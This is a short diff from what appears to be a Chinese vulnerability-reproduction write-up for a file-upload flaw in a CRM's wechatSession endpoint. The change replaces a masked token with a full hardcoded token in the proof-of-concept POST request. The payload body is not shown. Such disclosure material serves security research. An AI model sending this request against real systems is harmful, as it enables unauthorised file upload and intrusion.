@@ -58,7 +58,7 @@ schema_version: "1"
 
 ## 四、漏洞复现
 ```http
-POST /crm/wechatSession/index.php?token=9******************************f&msgid=1&operation=upload HTTP/1.1
+POST /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
 Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
